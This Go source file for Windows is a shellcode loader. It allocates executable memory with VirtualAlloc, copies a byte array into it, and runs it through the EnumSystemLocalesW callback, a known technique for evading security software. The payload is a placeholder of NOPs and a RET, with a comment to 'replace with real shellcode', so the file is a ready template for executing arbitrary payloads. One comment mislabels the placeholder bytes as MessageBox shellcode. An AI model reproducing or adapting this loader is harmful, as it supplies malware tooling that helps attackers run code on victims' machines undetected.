package main

import (
	"syscall"
	"unsafe"
)

var (
	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
	procEnumSystemLocalesW  = kernel32.NewProc("EnumSystemLocalesW")
	virtualAlloc             = kernel32.NewProc("VirtualAlloc")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func main() {
	// Example: Windows MessageBox shellcode (harmless, for demo)
	// 64-bit shellcode must match platform
	shellcode := []byte{
		0x90, 0x90, // NOPs (replace with real shellcode)
		0xC3,       // RET — just to safely return in this example
	}

	addr, _, err := virtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		panic(err)
	}

	// Copy shellcode to allocated memory
	shellcodePtr := unsafe.Pointer(addr)
	for i := 0; i < len(shellcode); i++ {
		*(*byte)(unsafe.Pointer(uintptr(shellcodePtr) + uintptr(i))) = shellcode[i]
	}

	// Call EnumSystemLocalesW with shellcode as callback
	ret, _, callErr := procEnumSystemLocalesW.Call(
		addr, // trampoline callback to shellcode
		0,
	)
	if ret == 0 {
		panic(callErr)
	}
}
